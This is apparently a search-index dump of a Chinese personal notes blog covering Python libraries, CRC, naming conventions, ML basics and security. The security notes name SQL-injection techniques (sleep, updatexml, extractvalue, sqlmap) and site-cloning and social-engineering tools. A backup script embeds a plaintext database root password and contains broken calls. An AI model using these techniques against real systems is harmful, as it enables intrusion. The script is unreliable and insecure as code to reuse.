'ABCDEFGHIJKLMNOPQRSTUVWXYZ'。 该值不依赖于语言区域，不会发生改变。 string.digits 字符串 '0123456789'。 string.hexdigits 字符串 '0123456789abcdefABCDEF'。 string.octdigits 字符串 '01234567'。 string.punctuation 由在 C 区域设置中被视为标点符号的 ASCII 字符所组成的字符串: !\"#$%&'()*+,-./:;<=>?@[\\]&#94;_`{|}~. string.printable 由被视为可打印符号的 ASCII 字符组成的字符串。 这是 digits, ascii_letters, punctuation 和 whitespace 的总和。 string.whitespace 由被视为空白符号的 ASCII 字符组成的字符串。 其中包括空格、制表、换行、回车、进纸和纵向制表符。 自定义字符串格式化","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-string.html","loc":"/yq-docs-rear-end-python-python-standard-library-string.html"},{"title":"py2app","text":"与 pyinstaller 结合使用, 构建程序包 使用 py2app 在哪个平台打包就生成哪种文件 安装: pip install py2app","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-py2app.html","loc":"/yq-docs-rear-end-python-python-three--party-library-py2app.html"},{"title":"pyinstaller","text":"python打包程序 安装: pip install pyinstaller 使用 py2app 在哪个平台打包就生成哪种文件 与py2app结合使用(MacOS)\n=======================================s 安装好pyinstaller和py2app后, cd进去项目目录 我的目录结构: .\n├── img\n│   ├── img.png\n│   ├── img_1.png\n│   └── img_2.png\n└── t_sheep.py 生成setup文件 会自动识别资源文件跟图标的(mac会): py2applet --make-setup t_sheep.py img logo.icns 目录: ├── img\n│   ├── img.png\n│   ├── img_1.png\n│   └── img_2.png\n├── setup.py          # 这个就是生成的\n└── t_sheep.py 打包: python3 setup.py py2app 目录: .\n├── build\n│   └── bdist.macosx-12-x86_64\n├── dist\n│   └── t_sheep.app   # 这个就是mac下的应用程序,\n├── img\n│   ├── img.png\n│   ├── img_1.png\n│   └── img_2.png\n├── setup.py\n└── t_sheep.py 完成后会在当前目录下的dist目录下有应用, 注意 setup 的资源配置: \"\"\"\nThis is a setup.py script generated by py2applet\n\nUsage:\n    python setup.py py2app\n\"\"\"\n\nfrom setuptools import setup\n\nAPP = ['t_sheep.py']\nDATA_FILES = []\nOPTIONS = {\n    # 指定要打包的第三方库\n    'includes': ['pygame'],\n    # 指定APP里用到的图片，音效，文件等，\n    # 可以指定文件夹，或是具体的文件\n    # 指定文件夹就会把整个文件夹都打包\n    # 这些内容如果放在上面的DATA_FILES里，也可以达到同等效果\n    # 资源文件\n    'resources': ['img'],\n    # APP执行时显示的图标，icns是MAC图标的标准文件\n  # 生成图标 https://www.jianshu.com/p/33df84bb52c2\n    # 'iconfile': 'LOGO.icns',\n    # 有待研究，暂时只设定了版本号\n    'plist': {'CFBundleShortVersionsString': '0.1.0'},\n\n    # 参考: https://py2app.readthedocs.io/en/latest/options.html#option-reference\n}\n\nsetup(\n    app=APP,\n    data_files=DATA_FILES,\n    options={'py2app': OPTIONS},\n    setup_requires=['py2app'],\n) MacOS生成应用图标可参考 图标制作 例如: # 命令格式：sips -z 新图片宽度 新图片高度 原图片名 --out 临时.iconset/新图片完整名\n# 注意一定要以 icon_**.png或者icon_**@2x.png格式, 否则会失败\nsips -z 16 16 img.png --out tmp.iconset/icon_16x16.png\nsips -z 32 32 img.png --out tmp.iconset/icon_32x32.png\nsips -z 128 128 img.png --out tmp.iconset/icon_128x128.png\nsips -z 256 256 img.png --out tmp.iconset/icon_256x256.png 用.iconset生成.icns(MacOS用图标集合): # 命令格式：iconutil -c icns 临时.iconset -o 名字.icns\n# 举个栗子：iconutil -c icns tmp.iconset -o logo.icns 这里可参考: https://blog.csdn.net/ypf1024/article/details/114011755","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyinstaller.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyinstaller.html"},{"title":"schedule","text":"定时任务处理模块 python定时任务（schedule）: import schedule\n\ndef job(name):\n    print(\"her name is : \", name)\n\nname = \"longsongpong\"\n\nschedule.every(10).minutes.do(job, name)                # 每隔十分钟执行一次任务\nschedule.every().hour.do(job, name)                     # 每隔一小时执行一次任务\nschedule.every().day.at(\"10:30\").do(job, name)          # 每天的10:30执行一次任务\nschedule.every(5).to(10).days.do(job, name)             # 每隔5到10天执行一次任务\nschedule.every().monday.do(job, name)                   # 每周一的这个时候执行一次任务\nschedule.every().wednesday.at(\"13:15\").do(job, name)    # 每周三13:15执行一次任务\n\nwhile True:\n    schedule.run_pending()                              # run_pending：运行所有可以运行的任务 此处学习是由于网络脚本定时器的编写，完成的python脚本代码如下: #!/usr/local/bin/python\nimport schedule\nimport time\nimport os\n\n\ndef backup():\n    os.system(\"cd ~/;\"\n              \"cd ~/sql_backup 2> /dev/null || mkdir sql_backup && cd ~/sql_backup;dir=$(date +'%Y-%m-%d');\"\n              \"mkdir ${dir} 2>/dev/null;\"\n              \"mysqldump -uroot -pduoyiIm trainning_server_db user > ~/sql_backup/${dir}/user.sql;\"\n              \"mysqldump -uroot -pduoyiIm trainning_server_db co_group > ~/sql_backup/${dir}/co_group.sql;\"\n              \"mysqldump -uroot -pduoyiIm trainning_server_db co_group_mem > ~/sql_backup/${dir}/co_group_mem.sql;\"\n              \"mysqldump -uroot -pduoyiIm trainning_server_db tbl_user_private \"\n              \"> ~/sql_backup/${dir}/tbl_user_private.sql;\")\n\nschedule.every.day().at(\"5:00\").do(backup)\nwhile true:\n    schedule.run_pending()","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-schedule.html","loc":"/yq-docs-rear-end-python-python-three--party-library-schedule.html"},{"title":"beautifulsoup4","text":"是解析、遍历、维护、\"标签树\"的功能库 相关资源 pypi地址: https://pypi.org/project/beautifulsoup4/ 源码: git clone https://git.launchpad.net/beautifulsoup , 仓库: https://code.launchpad.net/beautifulsoup/ 官网中文文档: https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/ 安装: pip install beautifulsoup4 可以算是一个爬虫模块, 比如对 HTML 进行解析, 便于后续操作 支持的解析器: 解析器 使用方法 优势 Python标准库 BeautifulSoup(html, \"html.parser\") 1、Python的内置标准库\n2、执行速度适中\n3、文档容错能力强 lxml HTML BeautifulSoup(html, \"lxml\") 1、速度快\n2、文档容错能力强 lxml XML BeautifulSoup(html, [\"lxml\", \"xml\"])\nBeautifulSoup(html, \"xml\") 1、速度快\n2、唯一支持XML的解析器 html5lib BeautifulSoup(html, \"html5lib\") 1、最好的容错性\n2、以浏览器的方式解析文档\n3、生成HTML5格式的文档 使用说明 当使用 BeautifulSoup 来格式化的时候,\n返回的是 BeautifulSoup 对象(废话), 但是如果要对启动的内容进行操作,\n最好用 Tag 对象, 可由 soup.元素 获取 from bs4 import BeautifulSoup html = \"\"\" <html> <head> <title>The Dormouse's story</title> </head> <body> <p class=\"title\"><b>The Dormouse's story</b> <p class=\"story\">Once upon a time there were three little sisters; and their names were</p> <a href=\"http://example.com/elsie\" class=\"sister\"></a> </body> </html> \"\"\" soup = BeautifulSoup ( html , \"html.parser\" ) # 获取 body soup . html . body API参考 BeautifulSoup 实例方法 new_tag 创建一个新的标签, 使用当前实例的格式, 比如 html.parser 源码 new_tag ( self , name , namespace = None , nsprefix = None , attrs = {}, sourceline = None , sourcepos = None , ** kwattrs ) 参数说明 name 标签名, 比如 div attrs 需要设置的属性字典 类方法 BeautifulSoup/element.Tag 实例方法 find_all 查找所有符合条件的标签 源定义 find_all ( self , name = None , attrs = {}, recursive = True , string = None , limit = None , ** kwargs ) recursive=True 默认会递归找所有的, 如果只想找最外层的, 设置为 False find 只找第一个 append 添加标签 tag . append ( new_tag )","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-beautifulsoup4.html","loc":"/yq-docs-rear-end-python-python-three--party-library-beautifulsoup4.html"},{"title":"bs4","text":"bs4库 是解析、遍历、维护、\"标签树\"的功能库。 安装: pip install bs4 pypi地址: https://pypi.org/project/bs4/ 这是一个伪包, 实际用的还是 beautifulsoup4","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-bs4.html","loc":"/yq-docs-rear-end-python-python-three--party-library-bs4.html"},{"title":"CRC数据校验","text":"CRC（Cyclic Redundancy Check）循环冗余校验. 百度百科 - 循环冗余检查 是一种根据网上数据包或计算机文件等数据产生简短固定位数校验码的一种散列函数，主要用来检测或校验数据传输或者保存后可能出现的错误。生成的数字在传输或者存储之前计算出来并且附加到数据后面，然后接收方进行检验确定数据是否发生变化。一般来说，循环冗余校验的值都是32位的整数。 校验原理 被除数 除以 除数 = 商 发送端 和 接收端 选定一个特定的数 (这里称之且后文都称之为 除数 ) 在 发送端 发送的二进制帧附加一个 二进制校验码 , 生成一个 新的帧 . 注意: 需要保证能与 除数 整除 到达 接受端 , 使用接受到的 新的帧 , 尝试与 除数 整除, 没有余数 就是正确的, 有余数说明数据已被修改. 以上计算使用 模二除法 (没有进位) 模二计算 无进位的二进制计算 模二加法: 0+0=0\n0+1=1\n1+0=1\n1+1=0 模二减法: 0-0=0\n0-1=1\n1-0=1\n1-1=0 模二乘法: 0x0=0\n0x1=0\n1x0=0\n1x1=1 模二除法, 与普通除法类似, 不过加减时使用 模二加减法 示例 选定CRC生成多项式为 G ( X ) = X 4 + X 3 + 1 要求出二进制序列 10110011 的 CRC校验码. 首先, 将 CRC生成多项式 转换为二进制序列 11001 (第一位, 第四位, 第五位是1) 多项式的位数为5, 则在数据帧的后面加上 (5-1) 位 0, 数据帧变为 101100110000 , 然后使用模2除法除以除数 11001 , 得到余数 0100 (若余数位数不足, 在首部补0). 将计算出来的CRC校验码 0100 添加在原始帧的后面, 真正的数据帧为 101100110100 , 再把这个数据帧发送到接收端. 接收端收到数据帧后, 用上面选定的除数, 用模2除法除去, 验证余数是否为0, 如果为0, 则说明数据帧没有出错 看到一篇解释很详细的: 史上解释CRC最清楚的文章","tags":"杂乱无章","url":"/yq-docs-Chaotic-CRC-data-verification.html","loc":"/yq-docs-Chaotic-CRC-data-verification.html"},{"title":"代码命名","text":"类/函数声明 对于类名, 用名词, 因为表示的是对象 函数, 方法可以加入动词, 因为是表示行为. 命名规范 关于命名规范, 业界一般有以下两种: 驼峰\n- 大驼峰: 首字母大小, 后面每个逻辑断点的单词首字母也大写. 如: CatEyes\n- 小驼峰: 首字母小写, 后面每个逻辑断点的单词首字母大写. 如: catEyes 下划线: 每个逻辑断点处都加下划线. 如: cat_eyes 匈牙利: 变量名=属性+类型+对象描述. 如: m_iVar 除非所在单位有硬性规定, 否则使用时自由的, 混合用也可以. 附: 匈牙利命名法中常用的小写字母的前缀 前缀 类型 i 整型 n 短整型 (Short Int) l 长整型 (Long Int) c 有符号字符 (Char) by 字节 (Byte) w Word b 布尔值 (Boolean) s 字符串型 a 数组 (Array) p 指针(Pointer) lp 长指针(Long Pointer) m_ 类的成员 fn 函数 h Handle（句柄）","tags":"杂乱无章","url":"/yq-docs-Chaotic-Code-name.html","loc":"/yq-docs-Chaotic-Code-name.html"},{"title":"记录vs下载安装慢的问题","text":"首先获取下载地址,  比如下载vs2022相关软件包,  地址就是 download.visualstudio.microsoft.com (得自己找) 去 DNS查询网站 查询相关改下载地址的相关信息, 然后选择 ttl 最小的那个, 设置DNS dns网站查询 最后去windows修改DNS配置 (效果不一定) 修改dns配置 注解 顺便说一句,  想起之前windows登录微软账号时,  一直链不上网,  后面取消 ipv6 就可以了。","tags":"杂乱无章","url":"/yq-docs-Chaotic-Record-the-problem-of-slow-download-vs-download.html","loc":"/yq-docs-Chaotic-Record-the-problem-of-slow-download-vs-download.html"},{"title":"渗透测试流程","text":"渗透测试流程 信息收集 -> 漏洞扫描 -> 漏洞利用 -> 权限提升 -> 密码破解 -> 无线网络的渗透 信息收集 工具: dnsenum nmap amap maltego 画网络结构图","tags":"安全","url":"/yq-docs-Safety-Penetration-test-process.html","loc":"/yq-docs-Safety-Penetration-test-process.html"},{"title":"备忘","text":"HTTrack 克隆网站工具, 静态网页 还有一个 setoolkit 工具也可以 setoolkit 社会工程学工具(social engineering toolkit), 开源, 基于Python. 社会工程学工具 提权 注解 # todo: 为什么需要降权\n为什么需要降权? 并不是最高权限就可以做一切... 有点不理解, 后面处理 杂乱无章 加密方式: 对称加密 加解密使用同一钥匙\n- DES\n- AES 非对称加密 加解密使用不同钥匙\n- RSA 比如SSH的密钥登陆. HTTPS的证书(公钥大家都有, 用来加密数据, 私钥只有所有者有, 保证只有自己可以看) 技巧 仅靠非对称加密其实也不能真正保证安全, 数据包是在网络上流动的, 其他人可以直接在网络上获取加密后的包下次再直接用这个包. 所以设置超时是有必要的, 比如: 登陆时, 对密码先公钥加密, 再对加密后的数据加时间戳后再次加密, 保证了每次发包数据是不一样的,\n后端再设置一个较小的过期验证时间, 超时拒绝登陆. 不过也有一个问题, 再登陆有效期内, 还是可以被使用登陆. 只能尽量保证登陆有效期足够小等措施了. MAC地址结构 如: AA:BB:CC:DD:EE:FF 前三位 AA:BB:CC 表示厂商 后三位 DD:EE:FF 表示厂商分配的设备标识","tags":"安全","url":"/yq-docs-Safety-Some-memo.html","loc":"/yq-docs-Safety-Some-memo.html"},{"title":"漏洞缺陷分类","text":"产品缺陷 技术缺陷 管理缺陷 业务缺陷 人性漏洞(...) SQL注入漏洞 漏洞-获取数据 基于mysql延时\n- sleep 基于mysql报错\n- group_by\n- updatexml\n- extractvalue 漏洞-注入 基于user-agent sqlmap自动注入工具","tags":"安全","url":"/yq-docs-Safety-Vulnerable-defect-classification.html","loc":"/yq-docs-Safety-Vulnerable-defect-classification.html"},{"title":"颜色空间","text":"颜色空间也称彩色模型，用于描述色彩 常见的颜色空间包括 RGB、CMYK、YUK、L*A*B*、HSL和HSV/HSB等 RGB 最常用 工业界一种颜色标准 对 红绿蓝三个颜色通道的变化以及相互叠加来得到各式各样的颜色 每个通道各分为256阶 CMYK 主要用于纺织、上色 YUK 智能设备出图 HSV HSV色彩模式 色相(Hue) 物体传导或反射的波长。更常见的是以颜色比如红色，橘色或绿色来辨识，取 0-360 度的数值来衡量 饱和度(Saturation) 又称色度，是指色彩的强度或纯度，取值范围为 0%-100% 明度(Value) 表示颜色明亮的程度，取值范围为 0%(黑)-100%(白) other 灰度图","tags":"AI","url":"/yq-docs-AI-Computer-vision-Color-space.html","loc":"/yq-docs-AI-Computer-vision-Color-space.html"},{"title":"计算机视觉","text":"颜色空间","tags":"AI","url":"/yq-docs-AI-Computer-vision-index.html","loc":"/yq-docs-AI-Computer-vision-index.html"},{"title":"贝叶斯","text":"贝叶斯定理由英国数学家贝叶斯 ( Thomas Bayes 1702-1761年) 发展，\n用来描述两个条件概率之间的关系，比如: P(A|B) 和 P(B|A) 按照乘法法则，可以立刻导出: P(A∩B) = P(A)*P(B|A)=P(B)*P(A|B) 如上公式也可变形为: P(A|B)=P(B|A)*P(A)/P(B) 得到 事件A在事件B(发生)的条件下的概率 贝叶斯公式又被称为贝叶斯定理,\n贝叶斯规则是概率统计中的应用所观察到的现象对有关概率分布的主观判断（即先验概率）进行修正的标准方法。 公式 其中，P(A)可以称之为先验概率，P(A|B)是后验概率 应用场景：某些情况下很难得到  P(A|B)，所有根据别的来算 例子, 现分别有 A、B 两个容器，\n在容器 A 里分别有 7 个红球和 3 个白球，\n在容器 B 里有 1 个红球和 9 个白球，\n现已知从这两个容器里任意抽出了一个红球，问这个球来自容器 A 的概率是多少? 假设已经抽出红球为事件 B，\n选中容器 A 为事件 A，\n则有: P(B) = 8/20\nP(A) = 1/2\nP(B|A) = 7/10 按照公式，则有: P(A|B) = (7/10)*(1/2) / (8/20) = 0.875 参考: 百度百科-贝叶斯 正向概率与逆向概率 正向概率 假设袋子有N个白球，M个黑球，求摸一次为黑球的概率 逆向概率 如果我们事先不知道袋子里面黑白球比例，而是随机摸出一个（或几个）球，观察这些取出球的颜色，可以对袋子中黑白球的比例做出一个预测","tags":"AI","url":"/yq-docs-AI-Deep-learning-Bayez.html","loc":"/yq-docs-AI-Deep-learning-Bayez.html"},{"title":"卡尔曼滤波","text":"","tags":"AI","url":"/yq-docs-AI-Deep-learning-Carman-Filter.html","loc":"/yq-docs-AI-Deep-learning-Carman-Filter.html"},{"title":"Deep Neural Networks(DNN)","text":"深度神经网络（Deep Neural Networks， 简称DNN）是深度学习的基础 感知机 对输入响应输出, 可以将其当多单个神经元 神经网络 基于感知机的扩展，而DNN可以理解为有很多隐藏层的神经网络。\n多层神经网络和深度神经网络DNN其实也是指的一个东西，\nDNN有时也叫做多层感知机（Multi-Layer perceptron,MLP）。 从DNN按不同层的位置划分，DNN内部的神经网络层可以分为三类，\n输入层，隐藏层和输出层.\n一般来说第一层是输入层，最后一层是输出层，而中间的层数都是隐藏层。 层与层之间是全连接的.\n也就是说，第i层的任意一个神经元一定与第i+1层的任意一个神经元相连。\n虽然DNN看起来很复杂，但是从小的局部模型来说，\n还是和感知机一样，即一个线性关系: z = wx + b 加上一个激活函数: ø(z)","tags":"AI","url":"/yq-docs-AI-Deep-learning-DNN.html","loc":"/yq-docs-AI-Deep-learning-DNN.html"},{"title":"人脸识别","text":"由于训练集往往只有一张图片，所以需要比较的是差异值，即使用Similarity函数 Similarity: d(img1,img2)=degree of difference between images 比较距离编码 Siamese网络 三元组损失 同时看三张图片，属于同一个人的编码距离较小，反之较大 尽量选择差距小的图片来增大训练难度 转换为分类问题 选取两个神经网络，将两个结果再次输入到逻辑回归单元，","tags":"AI","url":"/yq-docs-AI-Deep-learning-Face-recognition.html","loc":"/yq-docs-AI-Deep-learning-Face-recognition.html"},{"title":"图像识别","text":"YOLO算法 使用滑动窗口预测每一个格子（比如 3x3，19x19） 在滑动窗口的基础上，将图片映射在 [0, 1] 之间，取交并比大于阈值的结果 对于检测窗口无结果的检测，出第一个概率p为0，其他输出都不用关心（不参与梯度计算） YOLO 算法训练时，只有一个包含对象中心的一个单元负责检测这个对象 交并比 (Intersection over Union) 计算两个边界框交集与并集之比 一般约定 iou >= 0.5，即检测正确 非最大值抑制 (Non-max Suppression) 确保算法对每个对象值检测一次 步骤 去掉概率小于阈值的结果 选择概率最高的 anchor box 自定义形状框，每个框都会有一个输出结果值 R-CNN 算法 先求出候选区域","tags":"AI","url":"/yq-docs-AI-Deep-learning-Image-Identification.html","loc":"/yq-docs-AI-Deep-learning-Image-Identification.html"},{"title":"模型训练可视化模块","text":"visdom 启动 visdom server: python -m visdom.server 这一步会有一个下载的过程，会比较慢 使用举例: import visdom\nimport numpy as np\n\nvis = visdom.Visdom()\nvis.text('he')\nvis.image(np.ones((3, 10, 10))) tensorboardx 使用, 先生成一个示例: from tensorboardX import SummaryWriter\n\nwriter = SummaryWriter('log')\n\nfor i in range(100):\n        writer.add_scalar('a', i, global_step=i)\n        writer.add_scalar('b', i**2, global_step=i)\nwriter.close() 启动: cd log\ntensorboard --log-dir ./","tags":"AI","url":"/yq-docs-AI-Deep-learning-Model-training-visualization-module.html","loc":"/yq-docs-AI-Deep-learning-Model-training-visualization-module.html"},{"title":"自然语言处理","text":"时序模型 构建 one-hot模型 对于某个时间步t， RNN会计算 $$ P(y&#94;{<t>}|y&#94;{<1>}, y&#94;{<2>}, y&#94;{<3>}, ... y&#94;{<t-1>} ) $$ 梯度爆炸 -- NaN （出现数值溢出）， 可以采用梯度修剪,\n即 当大于某一个阈值，就使用调整后的值 RNN 分类（常见） 多对多 比如机器翻译，机器翻译一般需要解码器，貌似是为了适配长度不一致的问题 多对一 比如情感分类问题（正/负面评价打分） GRU 与 LSTM GRU LSTM 长短时记忆网络 双向循环神经网络 BRNN 深层循环神经网络 DRNN 其实就是纵向叠加隐藏层","tags":"AI","url":"/yq-docs-AI-Deep-learning-Natural-language-processing.html","loc":"/yq-docs-AI-Deep-learning-Natural-language-processing.html"},{"title":"数据预处理","text":"数据的归一化和标准化是特征缩放(feature scaling)的方法，\n是数据预处理的关键步骤。\n不同评价指标往往具有不同的量纲和量纲单位，\n这样的情况会影响到数据分析的结果，\n为了消除指标之间的量纲影响，需要进行数据归一化/标准化处理，\n以解决数据指标之间的可比性。\n原始数据经过数据归一化/标准化处理后，各指标处于同一数量级，适合进行综合对比评价。 归一化/标准化实质是一种线性变换，线性变换有很多良好的性质，\n这些性质决定了对数据改变后不会造成\"失效\"，反而能提高数据的表现，\n这些性质是归一化/标准化的前提。\n比如有一个很重要的性质：线性变换不会改变原始数据的数值排序。 优点 归一化/标准化后可以加快梯度下降的求解速度 避免局部值偏差太大 归一化 归一化（Normalization） 归一化一般是将数据映射到指定的范围，用于去除不同维度数据的量纲以及量纲单位。 在机器学习领域中，不同评价指标（即特征向量中的不同特征就是所述的不同评价指标）往往具有不同的量纲和量纲单位，这样的情况会影响到数据分析的结果， 为了消除指标之间的量纲影响，需要进行数据标准化处理，\n以解决数据指标之间的可比性。原始数据经过数据标准化处理后，\n各指标处于同一数量级，适合进行综合对比评价。其中，最典型的就是数据的归一化处理。 常见的映射范围有 [0, 1] 和 [-1, 1] ，最常见的归一化方法就是 Min-Max 归一化。 Min-Max 归一化 Min-Max 归一化（Min-Max Normalization） 也称为离差标准化，是对原始数据的线性变换，使结果值映射到[0 - 1]之间。转换函数如下： 其中max为样本数据的最大值，min为样本数据的最小值。\n这种归一化方法比较适用在数值比较集中的情况。\n但是，如果max和min不稳定，很容易使得归一化结果不稳定，使得后续使用效果也不稳定，\n实际使用中可以用经验常量值来替代max和min。\n而且当有新数据加入时，可能导致max和min的变化，需要重新定义。 作用： 数据映射到指定的范围内进行处理，更加便捷快速。 把有量纲表达式变成无量纲表达式，便于不同单位或量级的指标能够进行比较和加权。\n经过归一化后，将有量纲的数据集变成纯量，还可以达到简化计算的作用。 注解 有时候我们希望将输入转换到[-1,1]的范围，可以使用以下的公式: 实质上，归一化的一般规范函数是: y = (ymax-ymin)*(x-xmin)/(xmax-xmin) + ymin。 标准化 标准化（Normalization） 注解 归一化和标准化的英文翻译是一致的，但是根据其用途（或公式）的不同去理解（或翻译） 标准化是依照特征矩阵的列处理数据。\n数据标准化方法有多种，\n如：直线型方法(如极值法、标准差法)、折线型方法(如三折线法)、曲线型方法(如半正态性分布)。\n不同的标准化方法，对系统的评价结果会产生不同的影响。其中，最常用的是Z-Score 标准化。 Z-Score 标准化 Z-Score 标准化（Z-Score Normalization） 这种方法给予原始数据的均值（mean）和标准差（standard deviation）进行数据的标准化。\n经过处理的数据符合标准正态分布，即均值为0，标准差为1，转化函数为 其中 u 是样本数据的均值（mean），\no 是样本数据的标准差（std）。\n此外，标准化后的数据保持异常值中的有用信息，\n使得算法对异常值不太敏感，这一点归一化就无法保证。 作用: 提升模型的收敛速度（加快梯度下降的求解速度） 提升模型的精度（消除量级和量纲的影响） 简化计算（与归一化的简化原理相同） 归一化和标准化的异同 区别 归一化是将样本的特征值转换到同一量纲下把数据映射到[0,1]或者[-1, 1]区间内，\n仅由变量的极值决定，因区间放缩法是归一化的一种。 标准化是依照特征矩阵的列处理数据，其通过求z-score的方法，\n转换为标准正态分布，和整体样本分布相关，每个样本点都能对标准化产生影响。 相同 它们的相同点在于都能取消由于量纲不同引起的误差；\n都是一种线性变换，都是对向量X按照比例压缩再进行平移。 归一化和标准化的适用场景 数据的分布本身就服从正态分布，使用Z-Score标准化 有离群值的情况：使用Z-Score 这里不是说有离群值时使用Z-Score不受影响，\n而是，Min-Max对于离群值十分敏感，因为离群值的出现，\n会影响数据中max或min值，从而使Min-Max的效果很差。\n相比之下，虽然使用Z-Score计算方差和均值的时候仍然会受到离群值的影响，\n但是相比于Min-Max法，影响会小一点 如果对输出结果范围有要求，用归一化 如果数据较为稳定，不存在极端的最大最小值，用归一化 如果数据存在异常值和较多噪音，用标准化，可以间接通过中心化避免异常值和极端值的影响 非线性变换 非线性变换经常用在数据分化比较大的场景，有些数值很大，有些很小。通过一些数学函数，将原始值进行映射。该方法包括 log、指数，正切等。需要根据数据分布的情况，决定非线性函数的曲线，比如log(V, 2)还是log(V, 10)等。 对数函数转换: y = log10(x) 反余切函数转换: y = atan(x) * 2 / π 参考:: 数据预处理：归一化和标准化 如何理解归一化（normalization）","tags":"AI","url":"/yq-docs-AI-Deep-learning-Pre--processing.html","loc":"/yq-docs-AI-Deep-learning-Pre--processing.html"},{"title":"风格迁移","text":"隶属于图像操作 注解 时隔两年, 已经忘了这些东西是啥玩意儿了 代价函数定义 图片一 C，  图片二 S， 风格迁移后的图片 G 内容代价函数 风格代价函数 注： i, j, k 表示高，宽，通道 总代价函数 更新的是生成图像的像素点的值","tags":"AI","url":"/yq-docs-AI-Deep-learning-Style-migration.html","loc":"/yq-docs-AI-Deep-learning-Style-migration.html"},{"title":"深度学习-概念性","text":"贝叶斯 风格迁移 卡尔曼滤波 模型训练可视化模块 人脸识别 图像识别 自然语言处理 DNN 数据预处理 卷积 信号分析 一个输入信号f(t)，经过一个线性系统（其特征可以用单位冲击响应函数g(t)描述）以后，\n输出信号应该是什么？实际上通过卷积运算就可以得到输出信号。 图像处理 输入一幅图像f(x,y)，经过特定设计的卷积核g(x,y)进行卷积处理以后，输出图像将会得到模糊，边缘强化等各种效果。 卷积的\"卷\"，指的的函数的翻转，从 g(t) 变成 g(-t) 的这个过程；\n同时，\"卷\"还有滑动的意味在里面（吸取了网友李文清的建议）。\n如果把卷积翻译为\"褶积\"，那么这个\"褶\"字就只有翻转的含义了。 卷积的\"积\"，指的是积分/加权求和。 对卷积的意义的理解： 从\"积\"的过程可以看到，我们得到的叠加值，是个全局的概念。 以信号分析为例，卷积的结果是不仅跟当前时刻输入信号的响应值有关，\n也跟过去所有时刻输入信号的响应都有关系，考虑了对过去的所有输入的效果的累积。 在图像处理的中，卷积处理的结果，其实就是把每个像素周边的，\n甚至是整个图像的像素都考虑进来，对当前像素进行某种加权处理。\n所以说，\"积\"是全局概念，或者说是一种\"混合\"，把两个函数在时间或者空间上进行混合。 那为什么要进行\"卷\"？直接相乘不好吗？ 进行\"卷\"（翻转）的目的其实是施加一种约束，\n它指定了在\"积\"的时候以什么为参照。\n在信号分析的场景，它指定了在哪个特定时间点的前后进行\"积\"，\n在空间分析的场景，它指定了在哪个位置的周边进行累积处理。 参考: 如何通俗易懂地解释卷积？ 本地PDF: ../../../../resources/pdf/如何通俗易懂地解释卷积？ - 知乎.pdf 一次重构自己的一个DNN模型发现的问题 交叉墒损失函数引起的bug 重构的时候发现一个bug 感觉是python底层解析执行的问题，向量化计算会失败, 出bug代码 向量化的计算结果与实际不一致 bug示例，部分截图 有意思的是，专门写了一个测试把原有数据拿去测试，居然复现不出 排查到凌晨，发现是这个问题。。。具体原因还没找到，只找到bug点。 先记录一下，以后再研究","tags":"AI","url":"/yq-docs-AI-Deep-learning-concept-index.html","loc":"/yq-docs-AI-Deep-learning-concept-index.html"},{"title":"方差与标准差","text":"方差和标准差都是用来度量数据的离散程度，即表征一组数据分布情况的统计量。 方差(variance) 所有数据与均值之差的平方和的平均值，\n它反映了数据的波动程度，也可以用来描述一个随机变量的分布情况。 通俗地来讲， 方差越大，数据的波动就越剧烈，说明数据之间的差异越大； 方差越小，数据的波动就越平稳，说明数据之间的差异越小。 为什么取平方？ 因为随机值和均值比较出现负偏差的时候，\n要取反才能和其他值比较，为了比较方便，统一取平方值进行比较. 不用绝对值, 是因为绝对值不可导, 没法求积分(现在数学界啥都要积分可导) 标准差(standard deviation) 方差的平方根，它也是用来衡量数据的离散程度，\n但更直观地反映了数据与均值之间的距离，即数据的离散程度。 标准差越大，数据的波动就越大，说明数据之间的差异越大； 标准差越小，数据的波动就越小，说明数据之间的差异越小。 因此，可以通过标准差来判断数据集中的数据点距离均值的程度，\n进而对数据的分布情况和变化趋势进行分析和解释。 为什么需要标准差? 可以简单的理解为, 方差如果带上单位, 也把单位给平方了, 比如\n单位是m, 方差因为会球平方, 单位就变成了 m&#94;2, 开个根号利于\n与原来的数据 xxx m 比较. 标准差和均值的量纲（单位）是一致的，在描述一个波动范围时标准差比方差更方便。\n比如一个班男生的平均身高是170cm,标准差是10cm,那么方差就是100cm&#94;2。\n可以进行的比较简便的描述是本班男生身高分布是170±10cm，方差就无法做到这点。\n这么说可或许不准确, 那换种说法: 假定这个班男生的身高服从正态分布，\n则有68.3%的男生身高落在170±10cm这个区间内。\n即: 正态分布中: P{μ-σ<X<μ+σ}=68.3%，同理P{μ-2σ<X<μ+2σ}=95.4%，P{μ-3σ<X<μ+3σ}=99.7%    # 均可在正态分布概率表格中查询。希望有帮助。 再举个例子，从正态分布中抽出的一个样本落在[μ-3σ, μ+3σ]这个范围内的概率是99.7%，\n也可以称为\"正负3个标准差\"。如果没有标准差这个概念，\n我们使用方差来描述这个范围就略微绕了一点。\n万一这个分布是有实际背景的，这个范围描述还要加上一个单位，\n这时候为了方便，人们就自然而然地将这个量单独提取出来了。 方差和标准差的区别 方差只有比较意义，没有数字意义； 标准差既有比较意义，也有数字意义。 为什么要通过方差来计算标准差？\n明明是根据标准差的意义推导出的方差，\n现在计算标准差，却要先算方差？明明是我先来的，为什么会这样呢？\n因为计算方便，不用考虑不同样本值和均值的正负比较和取反，具有普遍性。 示例: import math\n\ndef variance(data):\n    n = len(data)\n    mean = sum(data) / n\n    deviations = [(x - mean) ** 2 for x in data]\n    variance = sum(deviations) / n\n    return variance\n\ndef stdev(data):\n    return math.sqrt(variance(data))\n\ndata = [1, 2, 3, 4, 5]\nprint(\"数据集：\", data)\nprint(\"方差：\", variance(data))\nprint(\"标准差：\", stdev(data))","tags":"AI","url":"/yq-docs-AI-Digital-Differential-and-standard-difference.html","loc":"/yq-docs-AI-Digital-Differential-and-standard-difference.html"},{"title":"逻辑回归和线性回归","text":"应用领域： 线性回归（Linear Regression） 线性回归用于建立连续型目标变量与一个或多个自变量之间的线性关系。它通常用于预测数值型的输出，如房价预测、销售量预测等。 逻辑回归（Logistic Regression） 